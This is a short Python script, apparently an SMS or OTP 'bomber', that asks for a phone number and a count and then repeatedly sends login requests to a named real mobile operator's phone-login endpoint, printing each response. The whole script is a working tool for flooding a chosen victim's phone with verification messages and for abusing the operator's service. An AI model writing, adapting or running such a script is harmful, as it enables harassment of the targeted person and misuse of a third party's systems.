import requests
import json
import datetime
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
t= datetime.datetime.now()
while 1:
    print("Number Example 1234567890")
    name = input("Enter 1st Number ")

    i=int(input("Enter Counter "))
    y=0
    while y<i:
        url = 'https://smart1216.robi.com.bd/airtel_sivr/public/login/phone'
        myobj1 = {"cli":name}

#use the 'headers' parameter to set the HTTP headers:
        try:
            x=requests.post(url, data = json.dumps(myobj1),headers = {'Content-Type':'application/json','Host':'smart1216.robi.com.bd','Content-Length':'21','User-Agent':'gzip'})
            print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
            print("Verify: ",x.text)
        except:
            print(f"{bcolors.FAIL}{bcolors.BOLD}")
            print("Server Error")
        print(y)
        y= y+1
    print("\nCounting Completed")
